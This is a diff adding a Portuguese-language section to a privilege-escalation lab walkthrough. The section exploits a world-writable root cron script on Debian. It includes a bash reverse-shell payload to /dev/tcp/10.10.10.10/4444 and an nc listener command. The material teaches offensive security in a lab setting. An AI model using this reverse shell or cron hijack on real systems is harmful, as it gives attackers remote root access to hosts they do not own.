@@ -361,3 +361,50 @@ void _init() {
 ### Questões:
 
 - a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
+
+## 8 - Cron Jobs - File Permissions
+
+Cron jobs são programas ou scripts que os usuários podem agendar para serem executados em horários ou intervalos específicos. Os arquivos de tabela cron (crontabs) armazenam a configuração para tarefas cron. O crontab de todo o sistema está localizado em /etc/crontab.
+
+Veja o conteúdo do crontab de todo o sistema:
+
+```shell
+cat /etc/crontab
+```
+![cat crontab](images/cat_crontab.png)
+
+Percebe-se que existem dois cron jobs programados para serem executados a cada minuto. Um executa overwrite.sh, o outro executa /usr/local/bin/compress.sh.
+
+Localize o caminho completo do arquivo overwrite.sh:
+
+```shell
+user@debian:~$ find / -name overwrite.sh -type f 2>/dev/null
+/usr/local/bin/overwrite.sh
+```
+É interessante checar as permissões desse arquivo. Agora que se sabe o caminho, poderia ser executado um ***ls -l /usr/local/bin/overwrite.sh***. Entretanto, o comando find usado anterior pode ser modificado para fazer as duas coisas, ou seja, localiza e já lista mostrando as permissões:
+
+```shell
+user@debian:~$ find / -name overwrite.sh -type f -exec ls -l {} \; 2> /dev/null
+-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
+```
+
+Como o arquivo possui permissão de gravação para outros usuários, ficou fácil. Basta modificar o arquivo overwrite.sh para um conteúdo malicioso, por exemplo, abrir um shell reverso, como abaixo:
+
+```shell
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+```
+
+**Obs.**: o ip 10.10.10.10 deve ser modificado para o IP da máquina atacante.
+
+Na máquina atacante, basta iniciar um netcat para escutar na porta 4444 com:
+
+```shell
+nc -nvlp 4444
+```
+
+Agora, basta aguardar a execução do cron job para ter uma sessão de shell reversa aberta no host atacante, a partir do host alvo.
+
+### Questões:
+
+- a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
